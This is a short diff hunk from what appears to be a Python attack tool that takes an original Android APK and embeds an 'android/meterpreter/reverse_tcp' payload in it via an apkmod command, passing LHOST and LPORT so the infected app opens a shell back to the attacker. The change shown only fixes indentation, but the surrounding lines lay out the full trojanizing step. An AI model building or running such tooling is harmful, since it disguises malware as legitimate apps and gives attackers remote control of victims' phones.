@@ -113,7 +113,7 @@ if option == "1":
         o_apk = input("Enter Your Original apk Path and Name:--->> ")
         print("")
         
-       payload = "android/meterpreter/reverse_tcp"
+        payload = "android/meterpreter/reverse_tcp"
         
         subprocess.call("apkmod -a -b -i " + o_apk + " -o " + virus + "" + "LHOST=" + LHOST + "" + "LPORT=" + LPORT , shell=True)
         print("")
